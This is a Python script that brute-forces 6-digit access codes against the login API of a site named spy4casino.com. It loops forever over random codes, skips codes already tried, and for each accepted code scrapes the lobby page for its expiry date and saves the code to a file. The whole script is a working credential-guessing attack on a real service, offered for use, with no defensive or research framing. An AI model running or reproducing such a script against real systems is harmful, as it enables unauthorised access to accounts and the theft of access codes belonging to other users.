from httpx import post, get
from re import search
import datetime
import random
import json

def grc(length=6):
    return ''.join(str(random.randint(0, 9)) for _ in range(length))

def countdown(target_date_str):
    target_date = datetime.datetime.strptime(target_date_str, "%Y-%m-%d %H:%M:%S")
    current_date = datetime.datetime.now()
    time_difference = target_date - current_date
    days = time_difference.days
    seconds = time_difference.seconds
    hours, seconds = divmod(seconds, 3600)
    minutes, seconds = divmod(seconds, 60)
    return f"expire in {days} days {hours} hours {minutes} minutes {seconds} seconds"

def loadcode(filename):
    try:
        with open(filename, 'r') as file:
            data = json.load(file)
    except FileNotFoundError:
        data = {"checked_codes": []}
    return data

def saveCHECK(data, filename):
    with open(filename, 'w') as file:
        json.dump(data, file, indent=4)

def saveJson(file_name, text):
    with open(file_name, 'a') as file:
        file.write(text + '\n')

def spy4casino(code, checkCODE):
    try:
        nicedayzc = loadcode(checkCODE)
        if code in nicedayzc['checked_codes']:
            print(f"[code] {code} has already been checked.")
            return

        response = post("https://spy4casino.com/api/check_login", headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept_pass": "NICEDAYZC#0001"
        }, data={
            "code": f"{code}"
        })
        nicedayzc['checked_codes'].append(code)
        saveCHECK(nicedayzc, checkCODE)

        if "true" in response.text:
            strmaker = get("https://spy4casino.com/lobby", cookies=response.cookies).text
            matches = search(r'var countDownDate = new Date\("(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})"\).getTime\(\);', strmaker)
            if matches:
                result = f"[{code}]: {countdown(matches.group(1))}"
                print(f"[code] {code} works and {countdown(matches.group(1))}")
                saveJson("output.txt", result)

        else:
            result = f"[{code}]: {code} does not work"
            print(f"[code] {code} does not work")

    except Exception as e:
        print(e)

if __name__ == "__main__":
    checkCODE = 'checked.json'
    saveCHECK(loadcode(checkCODE), checkCODE)

    while True:
        random_code = grc(6)
        spy4casino(random_code, checkCODE)
